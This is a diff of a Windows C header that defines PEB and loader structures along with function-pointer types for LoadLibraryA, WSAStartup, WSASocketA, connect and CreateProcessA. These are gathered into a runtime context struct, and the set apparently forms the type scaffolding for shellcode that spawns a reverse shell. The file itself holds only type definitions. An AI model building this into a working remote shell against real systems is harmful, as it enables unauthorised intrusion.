@@ -1,18 +1,28 @@
 #ifndef STRUCTS_H
 #define STRUCTS_H
 
+/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/
 #include <windows.h>
 
-#define MAX_PROTOCOL_CHAIN 7
-#define WSAPROTOCOL_LEN 255
+
+// https://learn.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
 
 // https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-wsaprotocolchain
+#define MAX_PROTOCOL_CHAIN 7
 typedef struct _WSAPROTOCOLCHAIN {
 	int   ChainLen;
 	DWORD ChainEntries[MAX_PROTOCOL_CHAIN];
 } WSAPROTOCOLCHAIN, *LPWSAPROTOCOLCHAIN;
 
+
 // https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-wsaprotocol_infoa
+#define WSAPROTOCOL_LEN 255
 typedef struct _WSAPROTOCOL_INFOA {
 	DWORD            dwServiceFlags1;
 	DWORD            dwServiceFlags2;
@@ -36,11 +46,6 @@ typedef struct _WSAPROTOCOL_INFOA {
 	CHAR             szProtocol[WSAPROTOCOL_LEN + 1];
 } WSAPROTOCOL_INFOA, *LPWSAPROTOCOL_INFOA;
 
-typedef struct _UNICODE_STRING {
-	USHORT Length;
-	USHORT MaximumLength;
-	PWSTR Buffer;
-} UNICODE_STRING, *PUNICODE_STRING;
 
 // http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FPEB_LDR_DATA.html
 typedef struct _PEB_LDR_DATA {
@@ -51,6 +56,7 @@ typedef struct _PEB_LDR_DATA {
     LIST_ENTRY InMemoryOrderModuleList;
 	LIST_ENTRY InInitializationOrderModuleList;
 } PEB_LDR_DATA, * PPEB_LDR_DATA;
+
 
 // https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntldr/ldr_data_table_entry.htm
 typedef struct _LDR_DATA_TABLE_ENTRY {
@@ -63,7 +69,9 @@ typedef struct _LDR_DATA_TABLE_ENTRY {
 	UNICODE_STRING FullDllName;
 	UNICODE_STRING BaseDllName;
 } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
-  
+
+
+// https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters
 typedef struct _RTL_USER_PROCESS_PARAMETERS {
 	BYTE Reserved1[16];
 	PVOID Reserved2[10];
@@ -71,8 +79,12 @@ typedef struct _RTL_USER_PROCESS_PARAMETERS {
 	UNICODE_STRING CommandLine;
 } RTL_USER_PROCESS_PARAMETERS,*PRTL_USER_PROCESS_PARAMETERS;
 
+
+// https://ntdoc.m417z.com/ps_post_process_init_routine
 typedef VOID (NTAPI *PPS_POST_PROCESS_INIT_ROUTINE)(VOID);
 	
+
+// https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb
 typedef struct _PEB {
 	BYTE Reserved1[2];
 	BYTE BeingDebugged;
@@ -94,5 +106,48 @@ typedef struct _PEB {
 	PVOID Reserved12[1];
 	ULONG SessionId;
 } PEB,*PPEB;
+
+
+// Function Pointers
+typedef HMODULE (WINAPI* PLOADLIBRARYA)(LPCSTR);
+typedef int (WINAPI* PWSASTARTUP)(WORD, LPWSADATA);
+typedef SOCKET (WINAPI* PWSASOCKETA)(int, int, int, WSAPROTOCOL_INFOA*, DWORD, DWORD);
+typedef int (WINAPI* PCONNECT)(SOCKET, struct sockaddr*, int);
+typedef BOOL (WINAPI* PCREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID , LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+
+
+// APIs
+typedef struct _WIN32_API {
+	PLOADLIBRARYA   pLoadLibraryA;
+	PWSASTARTUP     pWSAStartup;
+	PWSASOCKETA     pWSASocketA;
+	PCONNECT        pConnect;
+	PCREATEPROCESSA pCreateProcessA; 
+} WIN32_API, * PWIN32_API;
+
+
+// WinSock
+typedef struct _WIN32_SOCKET {
+	WSADATA         wsadata;
+	SOCKET          socket;
+	SOCKADDR_IN     sa;
+} WIN32_SOCKET, * PWIN32_SOCKET;
+
+
+// Process & Startup Info
+typedef struct _WIN32_PROCESS {
+	STARTUPINFO           si;
+	PROCESS_INFORMATION   pi;
+} WIN32_PROCESS, *PWIN32PROCESS;
+
+
+// Context
+typedef struct _RUNTIME_CONTEXT {
+	WIN32_API     api;
+	WIN32_SOCKET  winsock;
+	WIN32_PROCESS process;
+} RUNTIME_CONTEXT, * PRUNTIME_CONTEXT;
+
+/*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/
 
 #endif // STRUCTS_H
